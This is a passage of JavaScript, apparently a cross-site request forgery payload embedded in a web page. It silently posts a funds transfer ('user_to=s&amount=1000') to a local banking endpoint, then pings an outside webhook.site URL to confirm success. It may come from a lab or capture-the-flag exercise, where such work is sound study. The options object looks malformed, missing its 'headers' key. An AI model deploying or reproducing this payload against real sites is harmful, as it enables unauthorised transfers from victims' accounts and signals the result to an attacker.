        fetch("https://127.0.0.1:8080/transfer", {

                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: "user_to=s&amount=1000"
        })
        .then(response => response.text())
        .then(data => {
            console.log(data); // Log the response
            // If the transfer is successful, ping the webhook
            return fetch("https://webhook.site/a6d320d6-cbaa-4b5c-b216-dfcf9036b541", {
                method: "GET" // Ping the webhook
            });
        })
        .then(() => console.log("Webhook pinged successfully"))
        .catch(error => console.error("Error:", error));
    </script>
